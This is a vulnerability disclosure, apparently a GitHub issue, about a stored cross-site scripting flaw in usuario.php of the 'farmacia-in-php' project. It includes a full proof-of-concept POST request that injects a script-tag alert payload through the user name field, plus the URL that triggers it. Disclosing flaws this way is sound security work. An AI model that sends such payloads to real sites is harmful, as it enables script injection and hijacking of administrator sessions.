# farmacia-in-php has Based Cross Site Scripting vulnerability in usuario.php

## supplier 
https://code-projects.org/farmacia-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
usuario.php
## describe
There is an  Cross Site Scripting vulnerability in farmacia-in-php in usuario.php,  Control parameter: **$usuarios['nome']**

Malicious attackers can use this cross-site scripting vulnerability to conduct phishing attacks and obtain administrator login information and permissions.

## code analysis

echo $usuarios['nome'] without filtering，And $usuarios['nome'] is obtained from the database.This causes a stored cross-site scripting vulnerability

![image-20241119025357928](https://github.com/user-attachments/assets/77061e72-9eb9-4d12-a40f-f29f569bee61)



## POC

Inset the Scripting  into databases.

```
POST /adicionar-usuario.php HTTP/1.1
Host: farmacia
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------21880198377929761082162526974
Content-Length: 640
Origin: http://farmacia
Connection: close
Referer: http://farmacia/adicionar-usuario.php
Cookie: PHPSESSID=ff7cs1m7aghlhghsunaicnio6h
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------21880198377929761082162526974
Content-Disposition: form-data; name="nome"

<script>alert(1);</script>
-----------------------------21880198377929761082162526974
Content-Disposition: form-data; name="cargo"

1
-----------------------------21880198377929761082162526974
Content-Disposition: form-data; name="usuario"

1
-----------------------------21880198377929761082162526974
Content-Disposition: form-data; name="senha"

1
-----------------------------21880198377929761082162526974
Content-Disposition: form-data; name="acao"


-----------------------------21880198377929761082162526974--
 
```

**Result**

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://farmacia/usuario.php
```

![image-20241119025234290](https://github.com/user-attachments/assets/fe325e73-163a-4a37-b91a-e9141029ced3)